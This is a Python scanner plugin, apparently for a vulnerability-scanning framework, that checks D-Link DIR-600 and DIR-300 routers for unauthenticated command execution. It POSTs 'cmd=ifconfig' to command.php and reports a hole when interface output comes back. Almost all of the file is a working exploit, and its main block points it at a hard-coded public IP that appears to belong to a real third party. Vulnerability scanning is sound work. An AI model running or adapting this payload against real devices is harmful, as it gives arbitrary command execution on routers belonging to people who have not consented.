#!/usr/bin/env python
# coding: UTF-8

#ref: http://www.s3cur1ty.de/m1adv2013-003
#_PlugName= DLink DIR-600 and DIR-300 命令执行漏洞
#_FileName_= Dlink_DIR-600_DIR_300_Command_Execution.py
#__author__ = '飞狐'

import urlparse


def assign(service, arg):
    if service == 'd-link':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)


def audit(arg):
    url=arg+'command.php'
    postpayload='cmd=ifconfig'
    code,head,res,errcode,_ = curl.curl2(url,postpayload)
    if code==200 and "Ethernet  HWaddr" in res:
        security_hole('Find Command_Execution:' + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('d-link', 'http://5.172.188.155:8080/')[1])